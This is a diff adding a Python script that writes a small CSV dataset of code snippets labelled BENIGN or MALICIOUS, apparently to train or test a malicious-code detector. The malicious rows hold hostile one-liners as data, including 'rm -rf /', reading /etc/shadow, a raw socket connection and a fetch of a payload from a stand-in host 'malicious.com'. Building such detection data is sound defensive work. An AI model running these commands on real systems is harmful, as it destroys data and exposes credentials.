@@ -1,0 +1,34 @@
+import csv
+
+data = [
+    # Benign
+    ("print('Hello World')", "BENIGN"),
+    ("import math; print(math.sqrt(16))", "BENIGN"),
+    ("def add(a, b): return a + b", "BENIGN"),
+    ("import datetime; print(datetime.datetime.now())", "BENIGN"),
+    ("for i in range(10): print(i)", "BENIGN"),
+    ("import pandas as pd; df = pd.DataFrame()", "BENIGN"),
+    ("import numpy as np; arr = np.array([1, 2, 3])", "BENIGN"),
+    ("import requests; r = requests.get('https://google.com')", "BENIGN"),
+    ("from flask import Flask; app = Flask(__name__)", "BENIGN"),
+    ("class User: def __init__(self, name): self.name = name", "BENIGN"),
+    
+    # Malicious
+    ("import os; os.system('rm -rf /')", "MALICIOUS"),
+    ("import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('10.0.0.1', 8080))", "MALICIOUS"),
+    ("exec(\"import subprocess; subprocess.call(['ls', '-l'])\")", "MALICIOUS"),
+    ("eval(\"__import__('os').system('echo malicious')\")", "MALICIOUS"),
+    ("import subprocess; subprocess.run(['cat', '/etc/shadow'])", "MALICIOUS"),
+    ("import os; os.popen('whoami').read()", "MALICIOUS"),
+    ("import sys; sys.modules['os'].system('reboot')", "MALICIOUS"),
+    ("__import__('subprocess').check_output(['ls'])", "MALICIOUS"),
+    ("import base64; exec(base64.b64decode('cHJpbnQoJ2hlbGxvJyk='))", "MALICIOUS"),
+    ("import urllib.request; urllib.request.urlopen('http://malicious.com/payload.sh')", "MALICIOUS")
+]
+
+with open('dataset.csv', 'w', newline='') as f:
+    writer = csv.writer(f)
+    writer.writerow(["code", "label"])
+    writer.writerows(data)
+
+print("dataset.csv created successfully with robust quoting.")
